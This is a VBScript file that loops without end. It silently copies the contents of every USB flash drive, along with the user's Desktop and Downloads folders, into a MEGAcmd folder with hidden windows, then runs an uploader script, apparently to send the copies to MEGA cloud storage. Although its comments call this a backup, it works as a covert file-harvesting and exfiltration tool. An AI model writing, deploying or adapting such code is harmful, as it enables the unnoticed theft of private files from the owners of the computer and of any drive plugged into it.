Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject") ' Initialize the FileSystemObject

destinationRoot = "C:\Mega\MEGAcmd"
uploaderFile = "C:\Mega\MEGAcmd\uploader.vbs"

' Check if C:\Mega\MEGAcmd exists
If objFSO.FolderExists(destinationRoot) Then
    destination = destinationRoot & "\backup"

    ' Create the backup directory if it doesn't exist
    If Not objFSO.FolderExists(destination) Then
        objFSO.CreateFolder(destination)
    End If

    Do
        ' Check for USB flash drives
        Set colItems = objWMIService.ExecQuery("Select * from Win32_Volume Where DriveType = 2")
        For Each objItem in colItems
            driveLetter = objItem.DriveLetter
            source = driveLetter & "\*.*"
            destinationDrive = destination & "\" & Left(driveLetter, 1) & "\"

            ' Create the destination directory if it doesn't exist
            If Not objFSO.FolderExists(destinationDrive) Then
                objFSO.CreateFolder(destinationDrive)
            End If

            ' Copy files from the USB flash drive to the destination
            objShell.Run "cmd /c xcopy """ & source & """ """ & destinationDrive & """ /E /C /H /R /Y", 0, True
        Next

        ' Check for files/folders in Desktop
        desktopPath = objShell.SpecialFolders("Desktop")
        If objFSO.FolderExists(desktopPath) Then
            objShell.Run "cmd /c xcopy """ & desktopPath & "\*.*"" """ & destination & "\" & "Desktop" & "\" & """ /E /C /H /R /Y", 0, True
        End If

        ' Check for files/folders in Downloads
        downloadsPath = objShell.SpecialFolders("Downloads")
        If objFSO.FolderExists(downloadsPath) Then
            objShell.Run "cmd /c xcopy """ & downloadsPath & "\*.*"" """ & destination & "\" & "Downloads" & "\" & """ /E /C /H /R /Y", 0, True
        End If

        ' Run uploader.vbs script located in C:/Mega/MEGAcmd
        objShell.Run "cscript """ & uploaderFile & """", 0, True

        WScript.Sleep 5000 ' Wait for 5 seconds before checking for connected drives again
    Loop
End If
